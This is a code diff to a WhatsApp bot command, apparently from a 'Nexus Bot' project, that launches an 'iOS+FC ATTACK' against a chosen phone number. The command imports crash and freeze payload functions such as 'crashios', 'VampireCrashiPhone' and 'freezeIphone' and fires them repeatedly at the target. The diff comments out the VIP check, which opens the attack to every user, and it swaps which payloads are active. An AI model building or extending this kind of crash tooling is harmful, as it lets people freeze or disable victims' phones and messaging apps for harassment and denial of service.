@@ -19,10 +19,10 @@ export default {
       }
 
       const vipStatus = await VIPQueries.isVIP(userTelegramId)
-      if (!vipStatus.isVIP) {
+    /*  if (!vipStatus.isVIP) {
         await sock.sendMessage(m.chat, { text: "❌ VIP access required\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
         return
-      }
+      }*/
 
       if (!args || args.length === 0) {
         await sock.sendMessage(m.chat, { 
@@ -60,7 +60,7 @@ export default {
   iosinVisFC, NewProtocolbug6, VtxForceDelMsg2, SnitchDelayVolteX,
   freezeIphone, BlankVisco, PhotoDelay, IosInvisible, ContactXIos, StickerPackFreeze,
   VampireCrashiPhone, crashios, crashios3, protocolbug6, FlowXNull,
-  forceClick, XheavensdeeP, SqhForce, FreezePackk, CrashNotif
+  forceClick, XheavensdeeP, SqhForce, FreezePackk, CrashNotif, 
 } = await import("../../lib/buggers/bug.js")
 
       let progressMsg = await sock.sendMessage(m.chat, { 
@@ -72,7 +72,7 @@ export default {
       let progress = `🍎⚡ *iOS+FC ATTACK*\n\n🎯 Target: +${phoneNumber}\n\n📊 *Progress:*\n\n`
 
       const bugs = [
-        {name: 'StickerPackFreeze', fn: () => StickerPackFreeze(sock, target), count: 5 },
+        /*{name: 'StickerPackFreeze', fn: () => StickerPackFreeze(sock, target), count: 5 },
         { name: 'IosinVisFC', fn: () => iosinVisFC(sock, target), count: 5 },
         { name: 'CrashNotif', fn: () => CrashNotif(sock, target ), count: 10 },
         { name: 'NewProtocol6', fn: () => NewProtocolbug6(sock, target), count: 5 },
@@ -90,7 +90,9 @@ export default {
         { name: 'FlowXNull', fn: () => FlowXNull(sock, target), count: 5 },
         { name: 'ForceClick', fn: () => forceClick(sock, target), count: 5 },
         { name: 'XheavensdeeP', fn: () => XheavensdeeP(sock, target), count: 5 },
-        { name: 'SqhForce', fn: () => SqhForce(sock, target), count: 5 },
+        { name: 'SqhForce', fn: () => SqhForce(sock, target), count: 5 },*/
+         { name: 'freezeIphone', fn: () => freezeIphone(sock, target), count: 5 },
+         
         { name: 'FreezePack', fn: () => FreezePackk(sock, target), count: 5 }
       ]
 
